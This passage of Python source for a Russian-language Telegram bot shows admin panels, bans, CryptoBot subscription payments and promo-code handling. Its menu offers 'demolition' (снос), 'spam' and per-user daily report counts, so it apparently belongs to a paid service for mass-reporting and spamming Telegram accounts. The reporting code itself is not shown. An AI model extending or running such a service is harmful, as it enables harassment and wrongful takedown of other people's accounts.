        users_list += "📛 Usernames: " + ", ".join(private_users["usernames"])

    markup = InlineKeyboardMarkup(row_width=2)
    btn_add_private = InlineKeyboardButton('➕ Добавить прывата', callback_data='add_private')
    btn_remove_private = InlineKeyboardButton('➖ Удалить прывата', callback_data='remove_private')
    btn_back = InlineKeyboardButton('🔙 Назад', callback_data='admin_panel')
    markup.add(btn_add_private, btn_remove_private)
    markup.add(btn_back)

    if callback_query.message.photo:
        await bot.edit_message_caption(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            caption=users_list,
            reply_markup=markup
        )
    else:
        await bot.edit_message_text(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            text=users_list,
            reply_markup=markup
        )

@dp.callback_query_handler(lambda c: c.data == 'statsit', state='*')
async def statsit_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()

    if os.path.exists("users.txt"):
        with open("users.txt", "r") as file:
            user_ids = [line.strip() for line in file.readlines() if line.strip()]
            user_count = len(user_ids)
    else:
        user_count = 0

    statsit_message = (
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"📊 Статистика бота:\n\n"
        f"👥 Пользователей использует бот: {user_count}\n\n"
        "📌 Доступные действия:\n"
        "📥 Извлечь ID пользователей - Получить список ID пользователей.\n"
        "📊 Статистика бота - Просмотр общей статистики.\n"
        "📨 Отправить сообщение - Отправить сообщение всем пользователям.\n"
        "🔙 Назад - Вернуться в админ-панель.\n"
        "───── ⋆⋅☆⋅⋆ ─────"
    )

    markup = InlineKeyboardMarkup(row_width=2)
    btn_extract_users = InlineKeyboardButton('📥 Извлечь ID пользователей', callback_data='extract_users')
    btn_stats = InlineKeyboardButton('📊 Статистика бота', callback_data='stats')
    btn_send_message = InlineKeyboardButton('📨 Отправить сообщение', callback_data='send_message')
    btn_back = InlineKeyboardButton('🔙 Назад', callback_data='admin_panel')
    markup.add(btn_extract_users, btn_stats, btn_send_message)
    markup.add(btn_back)

    await bot.edit_message_caption(
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        caption=statsit_message,
        reply_markup=markup
    )

@dp.callback_query_handler(lambda c: c.data == 'banis_user', state='*')
async def banis_user_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()

    if os.path.exists("banned_users.txt"):
        with open("banned_users.txt", "r", encoding="utf-8") as file:
            banned_users = [line.strip() for line in file.readlines() if line.strip()]
            banned_count = len(banned_users)
            banned_list = ", ".join(banned_users)
    else:
        banned_count = 0
        banned_list = "Нет пользователей в бане."

    ban_message = (
        "───── ⋆⋅☆⋅⋆ ─────\n"
        "🚫 Управление блокировками\n\n"
        f"📊 Количество пользователей в бане: {banned_count}\n\n"
        f"🆔 Список забаненных пользователей:\n"
        f"{banned_list}\n"
        "───── ⋆⋅☆⋅⋆ ─────\n"
    )

    markup = InlineKeyboardMarkup(row_width=2)
    btn_add_user = InlineKeyboardButton('➕ Добавить пользователя', callback_data='add_user')
    btn_ban = InlineKeyboardButton('🚫Забанить🚫', callback_data='ban_user')
    btn_unban = InlineKeyboardButton('🔓Снять бан🔓', callback_data='unban_user')
    btn_back = InlineKeyboardButton('🔙 Назад', callback_data='admin_panel')
    markup.add(btn_ban, btn_unban)
    markup.add(btn_back)

    if callback_query.message.photo:
        await bot.edit_message_caption(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            caption=ban_message,
            reply_markup=markup
        )
    else:
        await bot.edit_message_text(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            text=ban_message,
            reply_markup=markup
        )

class Form(StatesGroup):
    user_id = State()
    date = State()
    new_date = State()
    delete_user_id = State()

@dp.callback_query_handler(lambda c: c.data == 'user', state='*')
async def user_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()

    paid_users_count = 0
    if os.path.exists('paid_users.txt'):
        with open('paid_users.txt', 'r') as file:
            for line in file:
                if line.strip():
                    paid_users_count += 1

    mes_text = (
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"📊 Количество пользователей с подпиской: {paid_users_count}\n\n"
        "Выберите действие:\n"
        "➕ Добавить пользователя - добавить нового пользователя в систему.\n"
        "🗑️ Удалить пользователя - удалить пользователя из системы.\n"
        "🕒 Изменить время - изменить время подписки для пользователя.\n"
        "🔙 Назад - вернуться в главное меню.\n"
        "───── ⋆⋅☆⋅⋆ ─────\n"
    )

    markup = InlineKeyboardMarkup(row_width=2)
    btn_add_user = InlineKeyboardButton('➕ Добавить пользователя', callback_data='add_user')
    btn_delete_user = InlineKeyboardButton('🗑️ Удалить пользователя', callback_data='delete_user')
    btn_change_time = InlineKeyboardButton('🕒 Изменить время', callback_data='change_time')
    btn_back = InlineKeyboardButton('🔙 Назад', callback_data='admin_panel')
    markup.add(btn_add_user, btn_delete_user, btn_change_time)
    markup.add(btn_back)

    if callback_query.message.photo:
        await bot.edit_message_caption(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            caption=mes_text,
            reply_markup=markup
        )
    else:
        await bot.edit_message_text(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            text=mes_text,
            reply_markup=markup
        )

@dp.callback_query_handler(lambda c: c.data == 'add_user')
async def process_callback_add_user(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    await Form.user_id.set()
    await bot.send_message(callback_query.from_user.id, "🆔 Введите ID пользователя:")

@dp.callback_query_handler(lambda c: c.data == 'delete_user')
async def process_callback_delete_user(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    await Form.delete_user_id.set()
    await bot.send_message(callback_query.from_user.id, "🆔 Введите ID пользователя для удаления:")

@dp.callback_query_handler(lambda c: c.data == 'change_time')
async def process_callback_change_time(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    await Form.user_id.set()
    await bot.send_message(callback_query.from_user.id, "🆔 Введите ID пользователя для изменения времени:")

@dp.message_handler(state=Form.user_id)
async def process_user_id(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['user_id'] = message.text
    await Form.next()
    await message.reply("📅 Введите дату в формате ГГГГ-ММ-ДД ЧЧ:ММ:СС:")

@dp.message_handler(state=Form.date)
async def process_date(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['date'] = message.text
        with open("paid_users.txt", "a") as file:
            file.write(f"\n{data['user_id']},{data['date']}\n")
    await state.finish()
    await message.reply("✅ Пользователь успешно добавлен!")

@dp.message_handler(state=Form.delete_user_id)
async def process_delete_user_id(message: types.Message, state: FSMContext):
    user_id = message.text
    with open("paid_users.txt", "r") as file:
        lines = file.readlines()
    with open("paid_users.txt", "w") as file:
        deleted = False
        for line in lines:
            if not line.startswith(f"{user_id},"):
                file.write(line)
            else:
                deleted = True
        if deleted:
            await message.reply(f"✅ Пользователь с ID {user_id} удален.")
        else:
            await message.reply(f"❌ Пользователь с ID {user_id} не найден.")
    await state.finish()

@dp.message_handler(state=Form.new_date)
async def process_new_date(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        new_date = message.text
        user_id = data['user_id']
        with open("paid_users.txt", "r") as file:
            lines = file.readlines()
        with open("paid_users.txt", "w") as file:
            updated = False
            for line in lines:
                if line.startswith(f"{user_id},"):
                    file.write(f"{user_id},{new_date}\n")
                    updated = True
                else:
                    file.write(line)
            if updated:
                await message.reply(f"✅ Время для пользователя с ID {user_id} изменено на {new_date}.")
            else:
                await message.reply(f"❌ Пользователь с ID {user_id} не найден.")
    await state.finish()

@dp.message_handler(state=Form.user_id, content_types=types.ContentTypes.TEXT)
async def process_change_time_user_id(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['user_id'] = message.text
        with open("paid_users.txt", "r") as file:
            lines = file.readlines()
            for line in lines:
                if line.startswith(f"{data['user_id']},"):
                    await message.reply(f"🕒 Текущее время для пользователя {data['user_id']}: {line.split(',')[1].strip()}")
                    await Form.new_date.set()
                    await message.reply("📅 Введите новое время в формате ГГГГ-ММ-ДД ЧЧ:ММ:СС:")
                    return
            await message.reply(f"❌ Пользователь с ID {data['user_id']} не найден.")
            await state.finish()


@dp.callback_query_handler(lambda c: c.data == 'view_admins', state='*')
async def view_admins_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    markup = InlineKeyboardMarkup(row_width=2)
    btn_add_admin = InlineKeyboardButton('➕ Добавить админ', callback_data='add_admin')
    btn_remove_admin = InlineKeyboardButton('➖ Удалить админ', callback_data='remove_admin')
    btn_back = InlineKeyboardButton('🔙 Назад', callback_data='admin_panel')

    if admin_chat_ids:
        admins_list = "👥\n".join(admin_chat_ids)
        admin_message = f"📊Список администраторов:\n{admins_list}"
        markup.add(btn_add_admin, btn_remove_admin)
        markup.add(btn_back)
    else:
        admin_message = "❌Список администраторов пуст."
        markup.add(btn_add_admin, btn_back)
        markup.add(btn_back)
    if callback_query.message.photo:
        await bot.edit_message_caption(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            caption=admin_message,
            reply_markup=markup
        )
    else:
        await bot.edit_message_text(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            text=admin_message,
            reply_markup=markup
        )

@dp.callback_query_handler(lambda c: c.data == 'add_admin', state='*')
async def add_admin_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer("Введите ID пользователя, которого хотите назначить администратором:")
    await state.set_state("wait_for_admin_id")

@dp.message_handler(state="wait_for_admin_id")
async def process_admin_id(message: types.Message, state: FSMContext):
    user_id = message.text
    if user_id.isdigit():
        if user_id not in admin_chat_ids:
            admin_chat_ids.append(user_id)
            await message.answer(f"✅Пользователь с ID {user_id} успешно добавлен в список администраторов.")
            await bot.send_message(user_id, "📢Вы были назначены администратором.📢")
        else:
            await message.answer(f"❌Пользователь с ID {user_id} уже является администратором.❌")
    else:
        await message.answer("❌Некорректный ID. Пожалуйста, введите числовой ID.❌")
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == 'remove_admin', state='*')
async def remove_admin_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer("Введите ID пользователя, которого хотите удалить из списка администраторов:")
    await state.set_state("wait_for_remove_admin_id")

@dp.message_handler(state="wait_for_remove_admin_id")
async def process_remove_admin_id(message: types.Message, state: FSMContext):
    user_id = message.text
    if user_id in admin_chat_ids:
        admin_chat_ids.remove(user_id)
        await message.answer(f"✅Пользователь с ID {user_id} успешно удален из списка администраторов.✅")
    else:
        await message.answer(f"❌Пользователь с ID {user_id} не найден в списке администраторов.❌")
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == 'back_to_main_menu', state='*')
async def back_to_main_menu_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    markup = InlineKeyboardMarkup(row_width=2)
    btn_support = InlineKeyboardButton('📢Написать поддержку📢', callback_data='support')
    btn_demolition = InlineKeyboardButton('💣 Снос💣', callback_data='demolition')
    btn_restore_account = InlineKeyboardButton('🔄Восстановить аккаунт🔄', callback_data='restore_account')
    btn_my_time = InlineKeyboardButton('👤Профиль👤', callback_data='my_time')
    btn_spam_menu = InlineKeyboardButton('🔥Спам🔥', callback_data='spam_menu')
    markup.add(btn_spam_menu)
    markup.add(btn_support, btn_demolition, btn_restore_account, btn_my_time)
    if str(callback_query.from_user.id) in admin_chat_ids:
        btn_admin_panel = InlineKeyboardButton('🛠Админ панель🛠', callback_data='admin_panel')
        markup.add(btn_admin_panel)
    await callback_query.message.edit_reply_markup(reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data == 'add_private', state='*')
async def add_private_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer("➕ Введите ID или username пользователя для добавления в прыват:")
    await state.set_state("waiting_for_private_add")

@dp.message_handler(state="waiting_for_private_add")
async def process_add_private(message: types.Message, state: FSMContext):
    user_input = message.text.strip()
    private_users = read_private_users()

    if user_input.isdigit():
        if int(user_input) not in private_users["ids"]:
            private_users["ids"].append(int(user_input))
            write_private_users(private_users)
            await message.answer(f"✅ Пользователь {user_input} успешно добавлен в прыват.")
        else:
            await message.answer(f"❌ Пользователь {user_input} уже есть в прывате.")
    else:
        username = user_input.lstrip('@')
        if username not in private_users["usernames"]:
            private_users["usernames"].append(username)
            write_private_users(private_users)
            await message.answer(f"✅ Пользователь {user_input} успешно добавлен в прыват.")
        else:
            await message.answer(f"❌ Пользователь {user_input} уже есть в прывате.")
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == 'remove_private', state='*')
async def remove_private_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer("➖ Введите ID или username пользователя для удаления из прывата:")
    await state.set_state("waiting_for_private_remove")

@dp.message_handler(state="waiting_for_private_remove")
async def process_remove_private(message: types.Message, state: FSMContext):
    user_input = message.text.strip()
    private_users = read_private_users()

    if user_input.isdigit():
        if int(user_input) in private_users["ids"]:
            private_users["ids"].remove(int(user_input))
            write_private_users(private_users)
            await message.answer(f"✅ Пользователь {user_input} успешно удален из прывата.")
        else:
            await message.answer(f"❌ Пользователь {user_input} не найден в прывате.")
    else:
        username = user_input.lstrip('@')
        if username in private_users["usernames"]:
            private_users["usernames"].remove(username)
            write_private_users(private_users)
            await message.answer(f"✅ Пользователь {user_input} успешно удален из прывата.")
        else:
            await message.answer(f"❌ Пользователь {user_input} не найден в прывате.")
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == 'ban_user', state='*')
async def ban_user_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer('📝Введите ID пользователя, которого хотите забанить:')
    await BanState.waiting_for_ban_user_id.set()

@dp.message_handler(state=BanState.waiting_for_ban_user_id)
async def ban_user_input(message: types.Message, state: FSMContext):
    user_id = message.text
    if user_id.isdigit():
        user_id = int(user_id)
        if user_id in banned_users:
            await message.answer(f'🚫 Пользователь с ID {user_id} уже забанен.')
        else:
            banned_users.add(user_id)
            save_banned_users(banned_users)
            await message.answer(f'✅ Пользователь с ID {user_id} забанен.')
            try:
                await bot.send_message(user_id, '📢Администратор посчитал ваш аккаунт подозрительным и вы были забанены📢')
            except Exception as e:
                logging.error(f'Error sending ban message to user {user_id}: {e}')
    else:
        await message.answer('❌ Неверный формат ID. Пожалуйста, введите числовой ID.')
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == 'unban_user', state='*')
async def unban_user_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer('📝Введите ID пользователя, которого хотите разбанить:')
    await BanState.waiting_for_unban_user_id.set()

@dp.message_handler(state=BanState.waiting_for_unban_user_id)
async def unban_user_input(message: types.Message, state: FSMContext):
    user_id = message.text
    if user_id.isdigit():
        user_id = int(user_id)
        if user_id not in banned_users:
            await message.answer(f'🚫 Пользователь с ID {user_id} не забанен.')
        else:
            banned_users.remove(user_id)
            save_banned_users(banned_users)
            await message.answer(f'✅ Пользователь с ID {user_id} разбанен.')
            try:
                await bot.send_message(user_id, '📢Ваш аккаунт был разбанен администратором📢')
            except Exception as e:
                logging.error(f'Error sending unban message to user {user_id}: {e}')
    else:
        await message.answer('❌ Неверный формат ID. Пожалуйста, введите числовой ID.')
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == "go_to_payment")
async def process_go_to_payment(callback_query: types.CallbackQuery):
    await callback_query.answer()
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("1 день⚡️", callback_data="period_1_day"))
    markup.add(InlineKeyboardButton("2 дня⚡️", callback_data="period_2_days"))
    markup.add(InlineKeyboardButton("5 дней⚡️", callback_data="period_5_days"))
    markup.add(InlineKeyboardButton("Месяц⚡️", callback_data="period_30_days"))
    markup.add(InlineKeyboardButton("Год⚡️", callback_data="period_1_year"))
    markup.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_start"))

    if callback_query.message.photo:
        await callback_query.message.edit_caption(
            caption="💸 *Выберите период доступа:* 💸",
            reply_markup=markup,
            parse_mode="Markdown"
        )
    else:
        await callback_query.message.edit_text(
            text="💸 *Выберите период доступа:* 💸",
            reply_markup=markup,
            parse_mode="Markdown"
        )

@dp.callback_query_handler(lambda c: c.data.startswith('period_'))
async def process_callback_period(callback_query: types.CallbackQuery):
    period = callback_query.data.split('_')[1] + "_" + callback_query.data.split('_')[2]
    keyboard = InlineKeyboardMarkup(row_width=2)
    for currency, price in CURRENCY_PRICES[period].items():
        keyboard.add(InlineKeyboardButton(f"{currency} 💳 ({price})", callback_data=f"pay_{period}_{currency}"))
    keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_periods"))

    await bot.answer_callback_query(callback_query.id)
    if callback_query.message.photo:
        await callback_query.message.edit_caption(
            caption=f"💸 *Выберите валюту для оплаты* ({period.replace('_', ' ')}) 💸",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
    else:
        await callback_query.message.edit_text(
            text=f"💸 *Выберите валюту для оплаты* ({period.replace('_', ' ')}) 💸",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )

@dp.callback_query_handler(lambda c: c.data.startswith('pay_'))
async def process_callback_currency(callback_query: types.CallbackQuery):
    parts = callback_query.data.split('_')
    period = parts[1] + "_" + parts[2]
    asset = parts[3]
    amount = CURRENCY_PRICES[period].get(asset, 0)
    duration_days = int(period.split('_')[0])
    invoice = create_invoice(asset=asset, amount=amount, description=f"Оплата через CryptoBot на {duration_days} дней/год")

    if invoice and 'result' in invoice:
        invoice_id = invoice['result']['invoice_id']
        pay_url = invoice['result']['pay_url']
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("💳 Оплатить", url=pay_url))
        markup.add(InlineKeyboardButton("✅ Проверить оплату", callback_data=f"check_{invoice_id}_{duration_days}"))
        markup.add(InlineKeyboardButton("🔙 Назад", callback_data=f"back_to_currencies_{period}"))

        await bot.answer_callback_query(callback_query.id)
        if callback_query.message.photo:
            await callback_query.message.edit_caption(
                caption="💸 *Оплатите по кнопке ниже и нажмите кнопку 'Проверить оплату'* 💸",
                reply_markup=markup,
                parse_mode="Markdown"
            )
        else:
            await callback_query.message.edit_text(
                text="💸 *Оплатите по кнопке ниже и нажмите кнопку 'Проверить оплату'* 💸",
                reply_markup=markup,
                parse_mode="Markdown"
            )
    else:
        await bot.answer_callback_query(callback_query.id, "❌ Ошибка при создании счета")

@dp.callback_query_handler(lambda c: c.data.startswith('back_to_'))
async def process_callback_back(callback_query: types.CallbackQuery):
    data = callback_query.data.split('_')
    if data[2] == "periods":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("1 день⚡️", callback_data="period_1_day"))
        markup.add(InlineKeyboardButton("2 дня⚡️", callback_data="period_2_days"))
        markup.add(InlineKeyboardButton("5 дней⚡️", callback_data="period_5_days"))
        markup.add(InlineKeyboardButton("Месяц⚡️", callback_data="period_30_days"))
        markup.add(InlineKeyboardButton("Год⚡️", callback_data="period_1_year"))
        markup.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_start"))

        if callback_query.message.photo:
            await callback_query.message.edit_caption(
                caption="💸 *Выберите период доступа:* 💸",
                reply_markup=markup,
                parse_mode="Markdown"
            )
        else:
            await callback_query.message.edit_text(
                text="💸 *Выберите период доступа:* 💸",
                reply_markup=markup,
                parse_mode="Markdown"
            )
    elif data[2] == "currencies":
        period = data[3] + "_" + data[4]
        keyboard = InlineKeyboardMarkup(row_width=2)
        for currency, price in CURRENCY_PRICES[period].items():
            keyboard.add(InlineKeyboardButton(f"{currency} 💳 ({price})", callback_data=f"pay_{period}_{currency}"))
        keyboard.add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_periods"))

        await bot.answer_callback_query(callback_query.id)
        if callback_query.message.photo:
            await callback_query.message.edit_caption(
                caption=f"💸 *Выберите валюту для оплаты* ({period.replace('_', ' ')}) 💸",
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
        else:
            await callback_query.message.edit_text(
                text=f"💸 *Выберите валюту для оплаты* ({period.replace('_', ' ')}) 💸",
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
    elif data[2] == "start":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💳Перейти к оплате", callback_data="go_to_payment"))
        markup.add(InlineKeyboardButton("🔑 Активировать Промокод", callback_data="activate_promo"))
        markup.add(InlineKeyboardButton("👑 Купить ВИП статус", callback_data="buy_vip"))
        if callback_query.message.photo:
            await callback_query.message.edit_caption(
                caption="🚀 Чтобы получить доступ к боту, необходимо оплатить подписку. Нажмите кнопку ниже, чтобы перейти к оплате.",
                reply_markup=markup
            )
        else:
            await callback_query.message.edit_text(
                text="🚀 Чтобы получить доступ к боту, необходимо оплатить подписку. Нажмите кнопку ниже, чтобы перейти к оплате.",
                reply_markup=markup
            )

class PromoStates(StatesGroup):
    promo_name = State()
    promo_end_date = State()
    promo_duration = State()
    promo_activations = State()
    edit_promo_name = State()
    edit_promo_end_date = State()
    edit_promo_duration = State()
    edit_promo_activations = State()
    choose_field_to_edit = State()

def read_promocodes():
         if not os.path.exists("promocodes.txt"):
             return []

         promocodes = []
         with open("promocodes.txt", "r", encoding="utf-8") as file:
             content = file.read().strip()
             if not content:
                 return promocodes
             blocks = content.split("-----------------------------\n")
             for block in blocks:
                 if not block.strip():
                     continue

                 promo_data = {}
                 for line in block.strip().split("\n"):
                     if ": " not in line:
                         continue
                     try:
                         key, value = line.split(": ", 1)
                         promo_data[key] = value
                     except ValueError:
                         continue
                 promocodes.append(promo_data)

         print("Прочитанные промокоды:", promocodes)
         return promocodes

def write_promocodes(promocodes):
    with open("promocodes.txt", "w", encoding="utf-8") as file:
        for promo in promocodes:
            file.write(f"🎫 Промокод: {promo['🎫 Промокод']}\n")
            file.write(f"⏳ Срок действия до: {promo['⏳ Срок действия до']}\n")
            file.write(f"⏳ Время, которое даёт: {promo['⏳ Время, которое даёт']}\n")
            file.write(f"🔢 Активаций: {promo['🔢 Активаций']}\n")
            file.write(f"👤 Активировали: {promo.get('👤 Активировали', '')}\n")
            file.write("-----------------------------\n")

@dp.callback_query_handler(lambda c: c.data == 'create_promo', state='*')
async def create_promo_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer("🎫 Введите название промокода:")
    await state.set_state(PromoStates.promo_name)

@dp.callback_query_handler(lambda c: c.data == 'delete_promo', state='*')
async def delete_promo_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer("❌ Введите название промокода для удаления:")
    await state.set_state("delete_promo_name")

@dp.callback_query_handler(lambda c: c.data == 'edit_promo', state='*')
async def edit_promo_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer("✏️ Введите название промокода для редактирования:")
    await state.set_state("edit_promo_name")

@dp.message_handler(state=PromoStates.promo_name)
async def process_promo_name(message: types.Message, state: FSMContext):
    await state.update_data(promo_name=message.text)
    await message.answer("⏳ Введите срок действия промокода в формате ГГГГ-ММ-ДД ЧЧ:ММ:СС:")
    await state.set_state(PromoStates.promo_end_date)

@dp.message_handler(state=PromoStates.promo_end_date)
async def process_promo_end_date(message: types.Message, state: FSMContext):
    try:
        end_date = datetime.strptime(message.text, "%Y-%m-%d %H:%M:%S")
        await state.update_data(promo_end_date=end_date)
        await message.answer("⏳ Введите, сколько времени даёт промокод (в формате ГГГГ-ММ-ДД ЧЧ:ММ:СС):")
        await state.set_state(PromoStates.promo_duration)
    except ValueError:
        await message.answer("❌ Неверный формат даты. Введите дату в формате ГГГГ-ММ-ДД ЧЧ:ММ:СС.")
        return

@dp.message_handler(state=PromoStates.promo_duration)
async def process_promo_duration(message: types.Message, state: FSMContext):
    try:
        duration = datetime.strptime(message.text, "%Y-%m-%d %H:%M:%S")
        await state.update_data(promo_duration=duration)
        await message.answer("🔢 Введите количество активаций (число или 'бесконечно'):")
        await state.set_state(PromoStates.promo_activations)
    except ValueError:
        await message.answer("❌ Неверный формат даты. Введите дату в формате ГГГГ-ММ-ДД ЧЧ:ММ:СС.")
        return

@dp.message_handler(state=PromoStates.promo_activations)
async def process_promo_activations(message: types.Message, state: FSMContext):
    data = await state.get_data()
    promo_name = data['promo_name']
    promo_end_date = data['promo_end_date'].strftime("%Y-%m-%d %H:%M:%S")
    promo_duration = data['promo_duration'].strftime("%Y-%m-%d %H:%M:%S")
    promo_activations = message.text
    promocodes = read_promocodes()
    promocodes.append({
        "🎫 Промокод": promo_name,
        "⏳ Срок действия до": promo_end_date,
        "⏳ Время, которое даёт": promo_duration,
        "🔢 Активаций": promo_activations,
        "👤 Активировали": ""
    })
    write_promocodes(promocodes)

    await message.answer(f"🎉 Промокод успешно создан!\n"
                         f"🎫 Название: {promo_name}\n"
                         f"⏳ Срок действия до: {promo_end_date}\n"
                         f"⏳ Время, которое даёт: {promo_duration}\n"
                         f"🔢 Активаций: {promo_activations}")
    await state.finish()

@dp.message_handler(state="delete_promo_name")
async def process_delete_promo_name(message: types.Message, state: FSMContext):
    promo_name = message.text
    promocodes = read_promocodes()
    updated_promocodes = [promo for promo in promocodes if promo['🎫 Промокод'] != promo_name]

    if len(updated_promocodes) == len(promocodes):
        await message.answer(f"❌ Промокод '{promo_name}' не найден.")
    else:
        write_promocodes(updated_promocodes)
        await message.answer(f"❌ Промокод '{promo_name}' успешно удалён.")
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == 'activate_promo', state='*')
async def activate_promo_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer("Введите название промокода для активации:")
    await state.set_state("activate_promo_name")

@dp.message_handler(state="activate_promo_name")
async def process_activate_promo_name(message: types.Message, state: FSMContext):
    promo_name = message.text
    user_id = str(message.from_user.id)
    current_time = datetime.now()

    with open("promocodes.txt", "r", encoding="utf-8") as file:
        lines = file.readlines()

    promo_found = False
    promo_index = -1
    activations_left = 0
    users_activated = []
    promo_end_date = None
    promo_duration = None

    for i, line in enumerate(lines):
        if f"🎫 Промокод: {promo_name}" in line:
            promo_found = True
            promo_index = i
        if promo_index != -1:
            if "⏳ Срок действия до:" in line:
                try:
                    time_str = line.split("⏳ Срок действия до:")[1].strip()
                    promo_end_date = datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
                except ValueError:
                    await message.answer("❌ Ошибка в формате срока действия промокода. Обратитесь к администратору.")
                    await state.finish()
                    return
            if "⏳ Время, которое даёт:" in line:
                try:
                    time_str = line.split("⏳ Время, которое даёт:")[1].strip()
                    promo_duration = datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
                except ValueError:
                    await message.answer("❌ Ошибка в формате времени промокода. Обратитесь к администратору.")
                    await state.finish()
                    return
            if "🔢 Активаций:" in line:
                activations_left = -1 if "бесконечно" in line else int(line.split(":")[1].strip())
            if "👤 Активировали:" in line:
                users_activated = line.split("👤 Активировали:")[1].strip().split(", ") if line.split("👤 Активировали:")[1].strip() else []

    if not promo_found:
        await message.answer("❌ Промокод не найден. Проверьте название и попробуйте снова.")
        await state.finish()
        return
    if user_id in users_activated:
        await message.answer("❌ Вы уже активировали этот промокод.")
        await state.finish()
        return
    if current_time > promo_end_date:
        await message.answer("❌ Срок действия промокода истёк.")
        await state.finish()
        return
    if activations_left == 0:
        await message.answer("❌ Лимит активаций этого промокода исчерпан.")
        await state.finish()
        return

    for i, line in enumerate(lines):
        if f"🎫 Промокод: {promo_name}" in line:
            if activations_left > 0:
                activations_left -= 1
                for j in range(i, len(lines)):
                    if "🔢 Активаций:" in lines[j]:
                        lines[j] = f"🔢 Активаций: {activations_left}\n"
                        break
            for j in range(i, len(lines)):
                if "👤 Активировали:" in lines[j]:
                    activated_users = lines[j].split("👤 Активировали:")[1].strip()
                    if not activated_users:
                        lines[j] = f"👤 Активировали: {user_id},\n"
                    else:
                        lines[j] = f"👤 Активировали: {activated_users}, {user_id},\n"
                    break

    with open("promocodes.txt", "w", encoding="utf-8") as file:
        file.writelines(lines)

    user_time = promo_duration
    with open("paid_users.txt", "a+", encoding="utf-8") as file:
        file.seek(0)
        paid_lines = file.readlines()
        user_found = False
        for i, line in enumerate(paid_lines):
            if str(user_id) in line:
                user_found = True
                paid_lines[i] = f"{user_id},{user_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                break
        if not user_found:
            paid_lines.append(f"{user_id},{user_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.seek(0)
        file.truncate()
        file.writelines(paid_lines)

    keyboard = InlineKeyboardMarkup()
    button = InlineKeyboardButton("Запуск", callback_data="send_welcome")
    keyboard.add(button)

    await message.answer(
        f"🎉 Промокод '{promo_name}' успешно активирован!\n"
        f"👤 Пользователь {user_id}\n"
        f"⏳ Получили время: {user_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"🔢 Осталось активаций: {activations_left if activations_left != -1 else 'бесконечно'}",
        reply_markup=keyboard
    )
    await state.finish()

from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from datetime import datetime


@dp.callback_query_handler(lambda c: c.data == 'my_time')
async def process_callback_my_time(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_name = callback_query.from_user.first_name
    user_username = callback_query.from_user.username or "отсутствует"
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Check daily limit from DB (same as in process_message_link_step)
    today = datetime.now().date()
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT count FROM user_reports
        WHERE user_id = ? AND report_date = ?
    ''', (user_id, today))
    result = cursor.fetchone()

    if result is None:
